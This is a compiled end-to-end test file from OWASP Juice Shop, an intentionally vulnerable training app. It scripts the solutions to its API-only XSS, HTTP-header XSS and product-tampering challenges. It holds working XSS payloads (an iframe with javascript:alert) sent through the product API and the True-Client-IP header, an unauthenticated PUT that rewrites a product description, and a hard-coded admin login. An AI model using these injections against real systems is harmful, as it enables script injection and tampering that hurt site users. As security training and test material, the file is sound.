"use strict";
/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */
Object.defineProperty(exports, "__esModule", { value: true });
const config = require("config");
const protractor_1 = require("protractor");
const e2eHelpers_1 = require("./e2eHelpers");
const product_1 = require("../../models/product");
const utils = require('../../lib/utils');
describe('/api', () => {
    if (!utils.disableOnContainerEnv()) {
        describe('challenge "restfulXss"', () => {
            (0, e2eHelpers_1.beforeEachLogin)({ email: `admin@${config.get('application.domain')}`, password: 'admin123' });
            it('should be possible to create a new product when logged in', () => {
                const EC = protractor_1.protractor.ExpectedConditions;
                void protractor_1.browser.executeScript((baseUrl) => {
                    const xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function () {
                        if (this.status === 200) {
                            console.log('Success');
                        }
                    };
                    xhttp.open('POST', `${baseUrl}/api/Products`, true);
                    xhttp.setRequestHeader('Content-type', 'application/json');
                    xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`);
                    xhttp.send(JSON.stringify({ name: 'RestXSS', description: '<iframe src="javascript:alert(`xss`)">', price: 47.11 }));
                }, protractor_1.browser.baseUrl);
                void protractor_1.browser.waitForAngularEnabled(false);
                void protractor_1.browser.get(`${e2eHelpers_1.basePath}/#/search?q=RestXSS`);
                void protractor_1.browser.refresh();
                void protractor_1.browser.driver.sleep(1000);
                const productImage = (0, protractor_1.element)(protractor_1.by.css('img[alt="RestXSS"]'));
                void productImage.click();
                void protractor_1.browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present on /#/search");
                void protractor_1.browser.switchTo().alert().then(alert => {
                    expect(alert.getText()).toEqual(Promise.resolve('xss'));
                    void alert.accept();
                    // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
                    product_1.ProductModel.findOne({ where: { name: 'RestXSS' } }).then((product) => {
                        product.update({ description: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch((error) => {
                            console.log(error);
                            fail();
                        });
                    }).catch((error) => {
                        console.log(error);
                        fail();
                    });
                });
                void protractor_1.browser.waitForAngularEnabled(true);
            });
            (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'API-only XSS' });
        });
    }
    describe('challenge "changeProduct"', () => {
        const tamperingProductId = ((() => {
            const products = config.get('products');
            for (let i = 0; i < products.length; i++) {
                if (products[i].urlForProductTamperingChallenge) {
                    return i + 1;
                }
            }
        })());
        const overwriteUrl = config.get('challenges.overwriteUrlForProductTamperingChallenge');
        it('should be possible to change product via PUT request without being logged in', () => {
            void protractor_1.browser.waitForAngularEnabled(false);
            void protractor_1.browser.executeScript((baseUrl, tamperingProductId, overwriteUrl) => {
                const xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function () {
                    if (this.status === 200) {
                        console.log('Success');
                    }
                };
                xhttp.open('PUT', `${baseUrl}/api/Products/${tamperingProductId}`, true);
                xhttp.setRequestHeader('Content-type', 'application/json');
                xhttp.send(JSON.stringify({
                    description: `<a href="${overwriteUrl}" target="_blank">More...</a>`
                }));
            }, protractor_1.browser.baseUrl, tamperingProductId, overwriteUrl);
            void protractor_1.browser.driver.sleep(1000);
            void protractor_1.browser.waitForAngularEnabled(true);
            void protractor_1.browser.get(`${e2eHelpers_1.basePath}/#/search`);
        });
        (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'Product Tampering' });
    });
});
describe('/rest/saveLoginIp', () => {
    if (!utils.disableOnContainerEnv()) {
        describe('challenge "httpHeaderXss"', () => {
            (0, e2eHelpers_1.beforeEachLogin)({ email: `admin@${config.get('application.domain')}`, password: 'admin123' });
            it('should be possible to save log-in IP when logged in', () => {
                void protractor_1.browser.waitForAngularEnabled(false);
                void protractor_1.browser.executeScript((baseUrl) => {
                    const xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function () {
                        if (this.status === 200) {
                            console.log('Success');
                        }
                    };
                    xhttp.open('GET', `${baseUrl}/rest/saveLoginIp`, true);
                    xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`);
                    xhttp.setRequestHeader('True-Client-IP', '<iframe src="javascript:alert(`xss`)">');
                    xhttp.send();
                }, protractor_1.browser.baseUrl);
                void protractor_1.browser.driver.sleep(1000);
                void protractor_1.browser.waitForAngularEnabled(true);
            });
            (0, e2eHelpers_1.expectChallengeSolved)({ challenge: 'HTTP-Header XSS' }); // TODO Add missing check for alert presence
        });
    }
    it('should not be possible to save log-in IP when not logged in', () => {
        void protractor_1.browser.waitForAngularEnabled(false);
        void protractor_1.browser.get(`${e2eHelpers_1.basePath}/rest/saveLoginIp`);
        void (0, protractor_1.$)('pre').getText().then(function (text) {
            expect(text).toMatch('Unauthorized');
        });
        void protractor_1.browser.driver.sleep(1000);
        void protractor_1.browser.waitForAngularEnabled(true);
    });
});
//# sourceMappingURL=restApiSpec.js.map